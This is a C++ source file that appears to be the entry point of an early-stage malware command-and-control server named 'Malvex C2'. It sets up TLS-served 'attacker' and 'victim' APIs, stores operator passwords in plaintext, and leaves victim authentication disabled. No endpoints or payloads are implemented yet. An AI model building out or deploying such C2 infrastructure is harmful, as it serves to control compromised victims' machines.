#include <cpppwn.hpp>
#include <SQLiteCpp/SQLiteCpp.h>
#include <base64.h>

#include <cstdint>
#include <iostream>
#include <print>
#include <thread>

#include "Database/Tables/Operators/OperatorRepository.hpp"
#include "HttpUtils.hpp"
#include "Types.hpp"
#include "Config.hpp"

static inline const std::string db_file{ "server.db" };

// function protos
void initial_setup();
void start_attacker_api(int16_t port);
void start_victim_api(int16_t port);

int main() {
    // Load / Initialize Cofnig
    auto& config = Config::instance(db_file);

    if (not config.has("attacker_api_port")) {
        initial_setup();
    }

    const int16_t attacker_port{ config.get<int16_t>("attacker_api_port", 1337) } ;
    const int16_t victim_port{ config.get<int16_t>("victim_api_port", 3000) };

    std::println("Staring Attacker API on Port: {}", attacker_port);
    std::jthread attacker_api(start_attacker_api, attacker_port);

    std::println("Staring Victim API on Port: {}", victim_port);
    std::jthread(start_victim_api, victim_port);
}

//-------------------------------------------------
//
//-------------------------------------------------
void initial_setup() {
    // Config
    auto& config = Config::instance(db_file);

    std::println("This is your first time starting Malvex C2 Server");
    std::println("To get started, we need to set up some things!\n");

    // attacker port
    int16_t attacker_port;
    std::print("Attacker API Should Listen on Port:");
    std::cin >> attacker_port;
    config.set("attacker_api_port", attacker_port);

    // victim port
    int16_t victim_port;
    std::print("Victim API Should Listen on Port:");
    std::cin >> victim_port;
    config.set("victim_api_port", victim_port);

    std::println("Generating Server Certificates...");

    auto [attacker_cert, attacker_key] = cpppwn::Server::generate_self_signed_cert("./attacker");
    config.set("attacker_cert", attacker_cert);
    config.set("attacker_key", attacker_key);

    auto [victim_cert, victim_key] = cpppwn::Server::generate_self_signed_cert("./victim");
    config.set("victim_cert", victim_cert);
    config.set("victim_key", victim_key);

    config.save();

    // Default user(s)
    std::println("You need to have at least one Attacker Account Set up!");
    bool create_user = true;
    OperatorRepository attacker_repo(db_file);
    do {
        OperatorDAO attacker;
        attacker.operator_uid = generate_uuid();
        attacker.clearance = 100;

        std::print("Attacker Username:");
        std::cin >> attacker.username;

        std::print("Attacker password:");
        std::cin >> attacker.password;

        attacker_repo.create(attacker);
        std::println("user [{}] created!", attacker.username);

        std::print("Would you like to create another user? [Y / N]");
        std::string input;
        std::cin >> input;

        if(input.starts_with('Y') || input.starts_with('y')) {
            create_user = true;
        } else {
            create_user = false;
        }

    } while (create_user);
}

//-------------------------------------------------
//
//-------------------------------------------------
bool basic_auth_middleware(const HttpRequest& request, HttpResponse& response) {
    // Get Authorization header
    auto auth_header = request.get_header("Authorization");
    OperatorRepository operator_repo(db_file);

    // Check if Authorization header exists
    if (auth_header.empty()) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Authentication required"})");
        std::println("Unauthorized: Authentication required");
        return false;
    }

    // Check if it's Basic auth
    const std::string basic_prefix = "Basic ";
    if (auth_header.substr(0, basic_prefix.length()) != basic_prefix) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid authentication method"})");
        std::println("Unauthorized: Invalid authentication method");
        return false;
    }

    // Extract and decode base64 credentials
    std::string encoded_credentials = auth_header.substr(basic_prefix.length());
    std::string decoded_credentials;

    try {
        decoded_credentials = base64_decode(encoded_credentials);
    } catch (...) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    // Parse username:password
    size_t colon_pos = decoded_credentials.find(':');
    if (colon_pos == std::string::npos) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    std::string username = decoded_credentials.substr(0, colon_pos);
    std::string password = decoded_credentials.substr(colon_pos + 1);

    // Authenticate
    auto auth_result = operator_repo.get(username)->password == password;

    if (not auth_result) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid username or password"})");
        return false;
    }

    // Authentication successful
    return true;
}

//-------------------------------------------------
//
//-------------------------------------------------
bool victim_auth_middleware(const HttpRequest& request, HttpResponse& response) {
    return true; //TODO: implement later

    // Get Authorization header
    auto auth_header = request.get_header("Authorization");
    OperatorRepository operator_repo(db_file);

    // Check if Authorization header exists
    if (auth_header.empty()) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Authentication required"})");
        return false;
    }

    // Check if it's Basic auth
    const std::string basic_prefix = "Basic ";
    if (auth_header.substr(0, basic_prefix.length()) != basic_prefix) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid authentication method"})");
        return false;
    }

    // Extract and decode base64 credentials
    std::string encoded_credentials = auth_header.substr(basic_prefix.length());
    std::string decoded_credentials;

    try {
        decoded_credentials = base64_decode(encoded_credentials);
    } catch (...) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    // Parse username:password
    size_t colon_pos = decoded_credentials.find(':');
    if (colon_pos == std::string::npos) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    std::string username = decoded_credentials.substr(0, colon_pos);
    std::string password = decoded_credentials.substr(colon_pos + 1);

    // Authenticate
    auto auth_result = operator_repo.get(username)->password == password;

    if (not auth_result) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid username or password"})");
        return false;
    }

    // Authentication successful
    return true;
}

//-------------------------------------------------
//
//-------------------------------------------------
void start_attacker_api(int16_t port) {
    using namespace cpppwn;
    auto& config = Config::instance(db_file);

    TlsConfig tls_conf{
        config.get<std::string>("attacker_cert"),
        config.get<std::string>("attacker_key")
    };

    RESTServer attacker_api(port, tls_conf);
    attacker_api.use_middleware(basic_auth_middleware);

    // basic auth test endpoint
    attacker_api.get("/auth", [](const HttpRequest& req) {
        (void) req;
        return HttpResponse().set_json(R"({"auth":"true"})");
    });

    //TODO: implement endpoints

    attacker_api.start();
}

//-------------------------------------------------
//
//-------------------------------------------------
void start_victim_api(int16_t port) {
    using namespace cpppwn;
    auto& config = Config::instance(db_file);

    TlsConfig tls_conf{
        config.get<std::string>("victim_cert"),
        config.get<std::string>("victim_key")
    };

    RESTServer victim_api(port, tls_conf);
    victim_api.use_middleware(victim_auth_middleware);

    //TODO: implement Endpoints

    victim_api.start();
}